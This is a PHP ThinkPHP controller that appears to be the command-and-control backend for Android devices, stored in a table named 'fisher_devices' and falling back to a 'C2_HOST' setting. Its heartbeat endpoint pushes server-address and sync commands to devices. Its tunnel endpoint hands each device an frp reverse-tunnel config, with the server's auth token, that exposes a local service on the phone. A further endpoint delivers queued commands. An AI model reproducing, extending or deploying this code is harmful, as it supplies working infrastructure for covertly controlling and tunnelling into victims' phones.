<?php
declare(strict_types=1);

namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

/**
 * DXS/libdxs short-path compatibility endpoints.
 *
 * The Android side probes paths like /s/hb, /s/tc and /s/td.  Bao塔 nginx only
 * forwarded /api and /m to ThinkPHP before, so these requests fell through to
 * the React index.html and the device logged "invalid character '<'".
 */
class ShortController extends BaseController
{
    public function dispatch(string $action = '')
    {
        $action = strtolower(trim($action));
        if (Request::isOptions()) return response('', 204);

        return match ($action) {
            'hb' => $this->heartbeat(),
            'tc' => $this->tunnelConfig(),
            'tk' => $this->commands(),
            'td', 'cr' => $this->commandResult(),
            default => json(['code' => 200, 'success' => true, 'ok' => true, 'data' => null, 'message' => 'ok']),
        };
    }

    private function input(): array
    {
        $data = Request::param();
        $raw = file_get_contents('php://input') ?: '';
        $json = json_decode($raw, true);
        if (is_array($json)) $data = array_merge($data, $json);
        return $data;
    }

    private function deviceId(array $data): string
    {
        return trim((string)($data['di'] ?? $data['deviceId'] ?? $data['device_id'] ?? $data['sessionId'] ?? ''));
    }

    private function publicServerAddr(): string
    {
        $domain = rtrim((string)Request::domain(), '/');
        if ($domain !== '' && !str_contains($domain, '127.0.0.1') && !str_contains($domain, 'localhost')) return $domain;
        $url = (string)(env('app.server_url', '') ?: env('APP_SERVER_URL', '') ?: env('C2_HOST', ''));
        if ($url !== '') return rtrim($url, '/');
        $host = (string)env('external.external_host', env('frps.frps_addr', '127.0.0.1'));
        $port = (string)env('external.external_port', '');
        if ($port !== '' && !in_array($port, ['80', '443'], true)) return "http://{$host}:{$port}";
        return ($port === '443' ? 'https' : 'http') . "://{$host}";
    }

    private function heartbeat()
    {
        $data = $this->input();
        $did = $this->deviceId($data);
        if ($did !== '') {
            Db::table('fisher_devices')->where('device_id', $did)->update([
                'local_service_connected' => 1,
                'last_seen' => time(),
            ]);
        }
        $serverAddr = $this->publicServerAddr();
        return json([
            'code' => 200,
            'success' => true,
            'ok' => true,
            'message' => 'ok',
            'data' => [
                'status' => 'alive',
                'serverAddr' => $serverAddr,
                'commands' => [
                    ['command' => 'setServerAddr', 'params' => ['serverAddr' => $serverAddr]],
                    ['command' => 'saveConfig', 'params' => (object)[]],
                    ['command' => 'forceSync', 'params' => (object)[]],
                ],
            ],
            'commands' => [],
            'serverAddr' => $serverAddr,
        ]);
    }

    private function tunnelConfig()
    {
        $data = $this->input();
        $did = $this->deviceId($data);
        if ($did === '') {
            return json(['code' => 400, 'success' => false, 'ok' => false, 'message' => 'deviceId required', 'data' => ['ci' => '']]);
        }

        $remotePort = (int)(Db::table('fisher_devices')->where('device_id', $did)->value('remote_port') ?: 0);
        if ($remotePort < 19902) {
            $maxPort = (int)(Db::table('fisher_devices')
                ->where('remote_port', '>=', 19902)
                ->where('remote_port', '<=', 29999)
                ->order('remote_port', 'desc')
                ->value('remote_port') ?: 19901);
            $remotePort = max(19902, $maxPort + 1);
            if ($remotePort > 29999) $remotePort = 19902;
            Db::table('fisher_devices')->where('device_id', $did)->update([
                'remote_port' => $remotePort,
                'tunnel_deployed' => 1,
                'last_seen' => time(),
            ]);
        }

        $frpsAddr = (string)env('frps.frps_addr', env('external.external_host', '127.0.0.1'));
        $frpsPort = (int)env('frps.frps_port', 7000);
        $token = (string)env('frps.frps_token', '');
        $localPort = (int)env('frps.local_service_port', 7912);
        if ($localPort === 7910) $localPort = 7912;
        $proxyName = 'tunnel_' . substr($did, 0, 8);
        $ci = "serverAddr = \"{$frpsAddr}\"\n"
            . "serverPort = {$frpsPort}\n"
            . "auth.method = \"token\"\n"
            . "auth.token = \"{$token}\"\n"
            . "transport.heartbeatInterval = 10\n"
            . "transport.heartbeatTimeout = 30\n\n"
            . "[[proxies]]\n"
            . "name = \"{$proxyName}\"\n"
            . "type = \"tcp\"\n"
            . "localIP = \"127.0.0.1\"\n"
            . "localPort = {$localPort}\n"
            . "remotePort = {$remotePort}\n";

        return json([
            'code' => 0,
            'success' => true,
            'ok' => true,
            'message' => 'ok',
            'data' => [
                'ci' => $ci,
                'configINI' => $ci,
                'remotePort' => $remotePort,
                'localPort' => $localPort,
                'frpsAddr' => $frpsAddr,
                'frpsPort' => $frpsPort,
            ],
            'remotePort' => $remotePort,
        ]);
    }

    private function commands()
    {
        $data = $this->input();
        $did = $this->deviceId($data);
        $commands = [];
        if ($did !== '') {
            $rows = Db::table('fisher_pending_commands')
                ->where('device_id', $did)
                ->whereNull('picked_at')
                ->order('created_at', 'asc')
                ->select()->toArray();
            foreach ($rows as $row) {
                $cmd = json_decode((string)$row['command_json'], true);
                if ($cmd) $commands[] = $cmd;
            }
            if ($rows) {
                Db::table('fisher_pending_commands')
                    ->whereIn('id', array_column($rows, 'id'))
                    ->update(['picked_at' => time()]);
            }
        }
        return json(['code' => 200, 'success' => true, 'ok' => true, 'message' => 'ok', 'commands' => $commands, 'data' => ['commands' => $commands]]);
    }

    private function commandResult()
    {
        $data = $this->input();
        $did = $this->deviceId($data);
        if ($did !== '') {
            Db::table('fisher_devices')->where('device_id', $did)->update(['last_seen' => time()]);
        }
        return json(['code' => 200, 'success' => true, 'ok' => true, 'data' => null, 'message' => 'ok']);
    }
}
